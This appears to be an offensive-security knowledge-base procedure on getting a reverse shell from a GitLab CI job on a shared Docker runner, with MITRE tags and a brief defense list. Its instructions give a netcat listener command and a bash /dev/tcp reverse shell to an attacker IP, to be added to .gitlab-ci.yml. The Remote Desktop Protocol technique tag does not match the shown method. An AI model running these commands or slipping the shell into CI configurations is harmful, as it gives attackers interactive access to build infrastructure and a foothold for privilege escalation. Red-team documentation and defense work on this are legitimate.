---
tags:
  - reverse-shell
  - ci-job
  - gitlab
type: procedure
tools:
  - '[[tools/nc]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/bash-reverse-shell-to-attacker]]'
  - '[[commands/nc-listen-for-shell]]'
platforms:
  - Linux
  - Docker
techniques:
  - '[[Unix Shell]]'
  - '[[Remote Desktop Protocol]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 470d3997-f81d-4197-bae9-6e19c1a8f9b5
created_at: '2025-12-14T04:08:48.124Z'
updated_at: '2025-12-14T04:08:48.124Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Remote Desktop Protocol]]'
---
# Gain Reverse Shell in GitLab CI Job

## Summary

This procedure establishes a reverse shell from a GitLab CI job running in a shared runner executor, providing shell access to the containerized environment for further exploitation.

## Description

In GitLab Shared Runners using Docker executors, CI jobs run in isolated containers but can execute arbitrary commands. By embedding a reverse shell in the job script, an attacker connects back to an external listener, bypassing inbound firewall restrictions. This grants interactive access to the executor, enabling subsequent privilege escalation and SSRF exploitation. Prerequisites include project access to trigger jobs; no elevated permissions needed initially.

## Requirements

1. GitLab project with shared runner access
2. External attacker machine reachable from executor (outbound TCP)
3. Netcat (nc) installed on attacker machine

## Defense

Defensive measures and detection strategies:

- Restrict CI job scripts to trusted repositories with code review
- Monitor executor logs for suspicious outbound connections (e.g., to high ports like 4444)
- Use network policies to block non-standard outbound traffic from runners

## Objectives

1. Achieve shell access in the executor container
2. Enable further host interaction
3. Set stage for privilege escalation

## Instructions

### Step 1: Setup Listener on Attacker Machine

**Context**: Prepare to receive the incoming shell connection.

**Command** ([[commands/nc-listen-for-shell]]):
```bash
nc -lvp 4444
```

> This listens on TCP port 4444 with verbose output, catching the reverse shell and providing an interactive session.

### Step 2: Trigger Reverse Shell in CI Job

**Context**: Execute the shell command within a GitLab CI job to connect back.

**Command** ([[commands/bash-reverse-shell-to-attacker]]):
```bash
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

> Add this to .gitlab-ci.yml under script:. It redirects stdin/stdout/stderr to a TCP connection to the attacker's IP:4444, establishing the shell. Replace 1.2.3.4 with actual IP.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Unix Shell]]
- [[Remote Desktop Protocol]]

### Sub-Techniques


## Commands Used

- [[commands/bash-reverse-shell-to-attacker]]
- [[commands/nc-listen-for-shell]]

## Tools Used

- [[tools/nc]]

## Tags

- reverse-shell
- ci-job
- gitlab
